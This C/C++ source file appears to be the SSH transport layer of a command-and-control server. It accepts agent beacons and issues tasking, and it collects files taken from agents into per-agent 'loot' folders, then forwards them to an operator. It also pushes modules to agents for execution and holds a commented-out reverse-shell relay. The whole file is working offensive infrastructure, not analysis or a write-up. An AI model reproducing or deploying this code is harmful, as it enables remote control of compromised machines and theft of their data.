#include "ssh_transport.h"

int type = 99; // type TRANSPORT

int port = 22;
ssh_bind sshbind;
ssh_session session;
ssh_channel channel;
pClientDat data;

transport_t transport_api = {
    send_ok, send_err, listen, read, write,
    download_file, get_loot, upload_file, get_info,
    init_reverse_shell, determine_handler, init, end, nullptr, 
    get_data
};

int init(pClientDat dat)
{
    data = dat;
}

int end()
{
    ssh_bind_free(sshbind);
    ssh_finalize();
}

int determine_handler(){
    ssh_message message;
    int rc = 0;
    int msgType = REQ_NONE;
    char buf[4096];
    char beacon[BUFSIZ];
    char tmp_buffer[3];
    char *tasking;
    char logbuff[BUFSIZ];
    memset(logbuff, 0, sizeof(logbuff));
    memset(tmp_buffer, 0, 3);
    
    do {
		//printf("entered message loop\n");
        message = ssh_message_get(session);
        if(message){
            switch(ssh_message_type(message)){
                case SSH_REQUEST_CHANNEL_OPEN:
                    if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
                        channel=ssh_message_channel_request_open_reply_accept(message);
                        break;
                    }
                default:
                    ssh_message_reply_default(message);
            }
            ssh_message_free(message);
        }
    } while(message && !channel);
    
	if(!channel){
        printf("Channel error : %s\n", ssh_get_error(session));
        ssh_finalize();
        return 1;
    }
    
	do {
        message=ssh_message_get(session);
        if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
           ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
				msgType = REQ_TASKING;
                ssh_message_channel_request_reply_success(message);
                break;
        }
        ssh_message_free(message);
    } while (message);
    
    
    switch (msgType)
    {
    case REQ_TASKING:
        ssh_channel_read(channel, tmp_buffer, 2, 0);
            
        if(tmp_buffer[0] == '0'){
            ssh_channel_write(channel, "ok", 2);
            return MANAG_TYPE;

        } else {
            // Check if ID exists
            memset(buf, 0, sizeof(buf));
            strcat(buf, "agents/");
            int exists = misc_directory_exists(strcat(buf, data->id));
        
            if(!exists){
                AgentInformationHandler::init(data->id);
                printf("Client %s: Initialized agent\n", data->id);
            }
            rc = ssh_channel_write(channel, "ok", 3);
            if(rc == SSH_ERROR){
                printf("Client %s: caught ssh error: %s", data->id, ssh_get_error(session));
                break;
            }

            rc = ssh_channel_read(channel, beacon, sizeof(beacon), 0);
            if(rc == SSH_ERROR){
                printf("Client %s: caught ssh error: %s", data->id, ssh_get_error(session));
                break;
            }
            AgentInformationHandler::write_beacon(data->id, beacon);

            tasking = AgentInformationHandler::get_tasking(data->id);
            if(!tasking){
                printf("Client %s: caught ssh error: %s", data->id, ssh_get_error(session));
                perror("Reason");
                break;
            }
            printf("Tasking being sent: %s\n", tasking);
            // Write tasking
            rc = ssh_channel_write(channel, tasking, strlen(tasking));
            if(rc == SSH_ERROR){
                printf("Client %s: Failed to write to channel: %s", data->id, ssh_get_error(session));
                break;
            }
            // Pass to handler
            return AGENT_TYPE;
        
        }
        
        break;
    default:
        printf("Client %s: got unknown message type: %d\n", data->id, msgType);
        break;
    }

    printf("Closing channels...\n");
    ssh_message_free(message);
    ssh_finalize();
	
    return -1;
}

/*Uploads a file to some connected entity*/
int upload_file(char *ptr, int is_module){
    char buff[BUFSIZ];
    char directory[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbuffer[8];
    char *file_data;
    char *enc_data;
    int size = 0;
    int size_e = 0;
    int rc = 0;

    
    memset(buff, 0, sizeof(buff));
    memset(directory, 0, sizeof(directory));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    memset(logbuff, 0, sizeof(logbuff));
    printf("Client %s: Sending file -> %s\n", data->id, ptr);
    
    // get filesize 
    snprintf(buff,8000, "%s/%s", getcwd(directory, sizeof(directory)), ptr);
    size = misc_get_file(buff, &file_data);
        
    if(size < 0){
        printf("Client %s: filename '%s' does not exist\n", data->id, buff);
    
        rc = ssh_channel_write(channel, "er", 3);
        if(rc == SSH_ERROR){
            printf("Client %s: Failed to write data to channel: %s\n", data->id, ssh_get_error(session));
        }
        return 2;
    }
    
    size_e = B64::enc_size(size);
    sprintf(tmpbuffer, "%d", size_e);
        
    // writes file size
    rc = ssh_channel_write(channel, tmpbuffer, sizeof(tmpbuffer));
    if(rc == SSH_ERROR){
        printf("Client %s: Failed to write data to channel: %s\n", data->id, ssh_get_error(session));
        return 1;
    }
    
    rc = ssh_channel_read(channel, buff, sizeof(buff), 0);
    if(rc == SSH_ERROR){
        printf("Client %s: Failed to read data from channel: %s\n", data->id, ssh_get_error(session));
        return 1;
    }
        
     B64::encode((unsigned char *)file_data, size, &enc_data);
        
    // writes file 
    rc = ssh_channel_write(channel, enc_data, size_e);
    if(rc == SSH_ERROR){
        printf("Client %s: Failed to write data to channel: %s\n", data->id, ssh_get_error(session));
        return 1;
    }
    memset(tmpbuffer, 0, 8);
    
    rc = ssh_channel_read(channel, tmpbuffer, 8, 0);
    if(rc == SSH_ERROR){
        printf("Client %s: Failed to read data from channel: %s\n", data->id, ssh_get_error(session));
        return 1;
    }

    
    if(is_module){
        printf("Client %s: Execution of module ended with exit code %s\n", data->id, tmpbuffer);
    }
    free(file_data);
    free(enc_data);

    return 0;
}

/*Downloads file from connected entity*/
int download_file(char *ptr, int is_manager, char *extra){
    int rc = 0;
    size_t size = 0;
    size_t size_e = 0;
    const char *data_ptr;
    unsigned char *enc_ptr;
    char buff[BUFSIZ*2];
    char tmpbuffer[256];
    char logbuff[BUFSIZ];
    FILE *file;


    rc = ssh_channel_write(channel, "ok", 3);
    if(rc == SSH_ERROR){
        printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
        return 1;
    }

    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    rc = ssh_channel_read(channel, tmpbuffer, sizeof(tmpbuffer), 0);
    if(rc == SSH_ERROR){
        printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
        return 1;
    }

    size = atoi(tmpbuffer);
    data_ptr = (const char *)malloc(size+1);
    memset((void*)data_ptr, 0, size+1);
            
    // writes file size
    rc = ssh_channel_write(channel, "ok", 3);
    if(rc == SSH_ERROR){
        printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
        return 1;
    }
    printf("%lu\n", size);
    size_t tmpint = 0;
    while (tmpint < size)
    {
        rc = ssh_channel_read(channel, (void *)data_ptr+strlen(data_ptr), size-tmpint, 0);
        if(rc == SSH_ERROR){
            printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
            return 1;
        }
        tmpint += rc;
    
    }
    

    size_e = B64::dec_size(data_ptr);

    enc_ptr = (unsigned char *)malloc(size_e);
    if(!B64::decode(data_ptr, enc_ptr, size_e)){
        printf("%s: Failed to decode data\n", data->id);
        free((void*)data_ptr);
        free(enc_ptr);
        rc = ssh_channel_write(channel, "er", 3);
        if(rc == SSH_ERROR){
            printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
            return 1;
        }
        return 1;
    }
    free((void*)data_ptr);
            
    // writes file 
    rc = ssh_channel_write(channel, "ok", 3);
    if(rc == SSH_ERROR){
        printf("%s: Caught channel error: %s\n", data->id, ssh_get_error(session));
        return 1;
    }

    memset(buff, 0, sizeof(buff));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    if(is_manager){
        sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), extra, ptr);
    } else {
        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), data->id, ptr);
    }
    printf("%s\n", buff);
    file = fopen(buff, "wb");
    if(file == NULL){
        perror("");
        return 1;
    }
    fwrite(enc_ptr, 1, size_e, file);
    fclose(file);
    free(enc_ptr);

    return 0;
}

/*Sends over all of the loot to the manager*/
int get_loot(char *loot){
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbf[3];
    int count;
    int ctr;
    int rc;
    int size;
    int size_e;
    char *tmp_ptr;
    char *tmp_ptr2;
    DIR *dir;
    FILE *file;
    struct dirent *ent;
    
    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));
    memset(logbuff, 0, sizeof(logbuff));
    printf("Manager %s: Sending Loot -> %s\n", data->id, loot);
    
    count = 0;
    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), loot);
             
    if((dir = opendir(buff)) != NULL){
        while((ent =readdir(dir)) != NULL){
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {
                count++;
            }
        }
    }
    closedir(dir);
    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), loot);
    memset(name, 0, sizeof(name));
    sprintf(name, "%d", count);
    
    rc = ssh_channel_write(channel, name, strlen(name));
    if(rc == SSH_ERROR){
        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
        return 1;
    }
    
    rc = ssh_channel_read(channel, tmpbf, 3, 0);//rd
    if(rc == SSH_ERROR){
        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
        return 1;
    }

    if(count == 0) return 0;
    
    if ((dir = opendir(buff)) != NULL) {
        /* print all the files and directories within directory */
        while ((ent = readdir (dir)) != NULL) {
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {
                memset(buff, 0, sizeof(buff));
                sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), loot, ent->d_name);
                file = fopen(buff, "r");
                
                rc = ssh_channel_write(channel, ent->d_name, strlen(ent->d_name));
                if(rc == SSH_ERROR){
                    printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
                    return 1;
                }

                rc = ssh_channel_read(channel, tmpbf, 3, 0); //ok
                if(rc == SSH_ERROR){
                    printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
                    return 1;
                }

                if(file == NULL){
                    printf("Manager %s: Could not read loot file %s\n", data->id, buff);
                    perror("");
                    return 2;
                } else {
                    ctr++;
                    memset(buff, 0, sizeof(buff));
                    printf("File opened successfully\n");
                    fseek(file, 0L, SEEK_END);
                    size = ftell(file);
                    size_e = B64::enc_size(size);
                    rewind(file);
                    tmp_ptr = (char *)malloc(size);
                    memset(tmp_ptr, 0, size);
                    fread(tmp_ptr, 1, size, file);
                    B64::encode((unsigned char*)tmp_ptr, size, &tmp_ptr2);
                    free(tmp_ptr);
                    memset(buff, 0, 256);
                    sprintf(buff, "%d", size_e);
                    
                    rc = ssh_channel_write(channel, buff, strlen(buff));
                    if(rc == SSH_ERROR){
                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
                        return 1;
                    }

                    rc = ssh_channel_read(channel, tmpbf, 3, 0);//ok
                    if(rc == SSH_ERROR){
                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
                        return 1;
                    }
                    
                    rc = ssh_channel_write(channel, tmp_ptr2, strlen(tmp_ptr2));
                    fclose(file);
                    free(tmp_ptr2);

                    if (ctr >= count)
                    {
                        printf("Finished writing loot to channel\n");
                        
                        rc = ssh_channel_write(channel, "fi", 3);
                        if(rc == SSH_ERROR){
                            printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
                            return 1;
                        }
                        closedir(dir);
                        break;
                    }                             
                    
                    rc = ssh_channel_write(channel, "nx", 3);
                    if(rc == SSH_ERROR){
                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
                        return 1;
                    }
                    printf("wrote next\n");
                    
                    rc = ssh_channel_read(channel, tmpbf, 3, 0); //rd
                    if(rc == SSH_ERROR){
                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
                        return 1;
                    }
                    printf("Read from channel\n");
                }
            }
        }
        
    } else {
        /* could not open directory */
        perror ("");
        return 2;
    }
    return 0;
}


/*Returns information on all of the agents the server manages*/
int get_info(char *ptr){
    int size = 0;
    int rc = 0;
    char buff[BUFSIZ];
    char name[BUFSIZ];
    char logbuff[BUFSIZ];
    char *dat = NULL;
    char tmpbf[3];
    DIR *dir;
    FILE *file;
    struct dirent *ent;

    memset(buff, 0, sizeof(buff));
    memset(name, 0, sizeof(name));
    memset(logbuff, 0, sizeof(logbuff));
    if ((dir = opendir ("agents/")) != NULL) {
        /* print all the files and directories within directory */
        while ((ent = readdir (dir)) != NULL) {
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..") || !strcmp(ent->d_name, "agents.dat")){
                continue;
            } else {
                memset(buff, 0, sizeof(buff));
                memset(name, 0, sizeof(name));
                sprintf(buff, "/agents/%s/info.txt", ent->d_name);
                getcwd(name, sizeof(name));
                strcat(name, buff);
                file = fopen(name, "r");
                memset(buff, 0, sizeof(buff));
                if(file == NULL){
                    printf("Manager %s: Could not get info on agent %s\n", data->id, ent->d_name);
                    perror("");
                } else {
                    // get file size
                    fseek(file, 0L, SEEK_END);
                    size = ftell(file);
                    printf("Size: %d\n", size);

                    // Allocate file memory 
                    dat = (char *)malloc(size);
                    memset(dat, 0, size);
                    rewind(file);
                    fread(dat, 1, size, file);
                    
                    rc = ssh_channel_write(channel, dat, strlen(dat));
                    free(dat);
                    if(rc == SSH_ERROR){
                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
                        return 1;
                    }
                    
                    rc = ssh_channel_read(channel, tmpbf, 3, 0);
                    if(rc == SSH_ERROR){
                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
                        return 1;
                    }
                }
            }
        }
        rc = ssh_channel_write(channel, "fi", 2);
        if(rc == SSH_ERROR){
            printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
            return 1;
        }
        closedir (dir);
    } else {
        /* could not open directory */
        printf("Manager %s: Failed to open directory\n", data->id);
            
        perror ("");
        return 2;
    }
    return 0;

}

void make_agent(char *dat_ptr, char *d_ptr){
    AgentInformationHandler::compile(dat_ptr, d_ptr);
}

int init_reverse_shell(char *id){
    /*class Server *srv = instance->get_server();
    std::queue<ConnectionInstance *> dequ;
    ConnectionInstance *inst = nullptr;
    int sz = 0;
    int rc = 0;
    int found = 0;
    int quitting = 0;
    char *recvbuff = (char *)malloc(BUFSIZ);
    memset(recvbuff, 0, BUFSIZ);

    while(!found){
        sz = srv->get_shell_queue()->size();
        for(int i = 0; i< sz; i++){
            inst = srv->get_shell_queue()->front();
            if(strncmp(id,inst->get_data()->id, strlen(id))){
                found = 1;
                srv->get_shell_queue()->pop();
                break;
            } else {
                srv->get_shell_queue()->push(instance);
                srv->get_shell_queue()->pop();
            }
        }
        sleep(0.5);
    }

    class ServerTransport *remote = inst->get_transport();

    while(!quitting){
        memset(recvbuff, 0, BUFSIZ);
        rc = read(&recvbuff, BUFSIZ);
        if(rc != 0){
            char logbuff[BUFSIZ];
            memset(logbuff, 0, sizeof(logbuff));
        
            printf("Shell %s->%s: Failed to handle shell: %s\n", data->id, remote->get_data()->id, ssh_get_error(session));
            inst->shell_finish();
            return 1;
        }

        memset(recvbuff, 0, BUFSIZ);
        rc = remote->write(recvbuff, BUFSIZ);
        if(rc != 0){
            char logbuff[BUFSIZ];
            memset(logbuff, 0, sizeof(logbuff));
        
            printf("Shell %s->%s: Failed to handle shell: %s\n", data->id, remote->get_data()->id, ssh_get_error(session));
            inst->shell_finish();
            return 1;
        }

        memset(recvbuff, 0, BUFSIZ);
        rc = remote->read(&recvbuff, BUFSIZ);
        if(rc != 0){
            char logbuff[BUFSIZ];
            memset(logbuff, 0, sizeof(logbuff));
        
            printf("Shell %s->%s: Failed to handle shell: %s\n", data->id, remote->get_data()->id, ssh_get_error(session));
            inst->shell_finish();
            return 1;
        }

        memset(recvbuff, 0, BUFSIZ);
        rc = write(recvbuff, BUFSIZ);
        if(rc != 0){
            char logbuff[BUFSIZ];
            memset(logbuff, 0, sizeof(logbuff));
        
            printf("Shell %s->%s: Failed to handle shell: %s\n", data->id, remote->get_data()->id, ssh_get_error(session));
            inst->shell_finish();
            return 1;
        }
    }
    inst->shell_finish();*/
    return 0;
}

int listen(){
    int r;

    int sock = socket(AF_INET , SOCK_STREAM , 0);
    
    sshbind=ssh_bind_new();
    session=ssh_new();

    ssh_options_set(session, SSH_OPTIONS_FD, &sock);
	
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");

    if(ssh_bind_listen(sshbind)<0){
        printf("Error listening to socket: %s\n", ssh_get_error(sshbind));
        return 1;
    }

    // bind the listener to the port
    printf("Server: Bound to listening port\n");

    r=ssh_bind_accept(sshbind, session);
    printf("Server: Accepting connection\n");
    if(r==SSH_ERROR){
      	printf("Error accepting a connection : %s\n",ssh_get_error(sshbind));
        return 1;
    }
    if (ssh_handle_key_exchange(session)) {
        printf("ssh_handle_key_exchange: %s\n", ssh_get_error(session));
        return 1;
    }

    int rc = authenticate();
    if (rc != 0)
    {
        printf("Initialization: Data Failed creation\n", data->id);
        return 1;
    }
    return 0;

}


int authenticate(){
    // initialize variables
    int auth=0;
    char *name = NULL;
    ssh_message message;
    
    do {
        message=ssh_message_get(session);
        if(!message)
            break;
        switch(ssh_message_type(message)){
            case SSH_REQUEST_AUTH:
                switch(ssh_message_subtype(message)){
                    // authenticate connection
                    case SSH_AUTH_METHOD_PASSWORD:
                        if(Authenticate::doauth(ssh_message_auth_user(message), ssh_message_auth_password(message))){
                            auth=1;
                            name = (char*)malloc(strlen(ssh_message_auth_user(message)));
                            memset(name, 0, strlen(ssh_message_auth_user(message)));
                            sprintf(name, "%s", ssh_message_auth_user(message));
                            ssh_message_auth_reply_success(message,0);
                            break;
                       	} else {
                            auth = 2;
                            ssh_message_reply_default(message);
                            break;
                        }
                    // not authenticated, send default message
                    case SSH_AUTH_METHOD_NONE:
                    default:
                        ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
                        ssh_message_reply_default(message);
                        break;
                }
                break;
            default:
                ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    } while (!auth);
    
    // Check if the client authenticated successfully
	if(auth != 1){
        printf("Server: Terminating connection\n");
        ssh_disconnect(session);
        return 1;
    } else {
        data->id = name;
        
        return 0;
    }
    return 1;
}

int read(char **buff, int length){
    int rc = 0;
    rc = ssh_channel_read(channel, *buff, length, 0);
    if (rc == SSH_ERROR)
    {
        char logbuff[BUFSIZ];
        memset(logbuff, 0, sizeof(logbuff));
        
        printf("Manager %s: Failed to handle agent: %s\n", data->id, ssh_get_error(session));
        return 1;
    }
    return 0;
        
}

int write(char *buff, int length){
    int rc = 0;
    rc = ssh_channel_write(channel, buff, length);
    if(rc == SSH_ERROR){
        printf("Manager %s: Failed to handle agent: %s\n", data->id, ssh_get_error(session));
        return 1;
    }
    return 0;
}

int send_err(){
    int rc = 0;
    rc = ssh_channel_write(channel, "er", 3);
    if (rc == SSH_ERROR)
    {
        printf("Manager %s: Failed to handle agent: %s\n", data->id, ssh_get_error(session));
        return 1;
    }
    return 0;
}

int send_ok(){
    int rc = 0;
    rc = ssh_channel_write(channel, "ok", 3);
    if (rc == SSH_ERROR)
    {
        printf("Manager %s: Failed to handle agent: %s\n", data->id, ssh_get_error(session));
        return 1;
    }
    return 0;
}

void set_port(int portno){
    port = portno;
}

pClientDat get_data(){
    return data;
}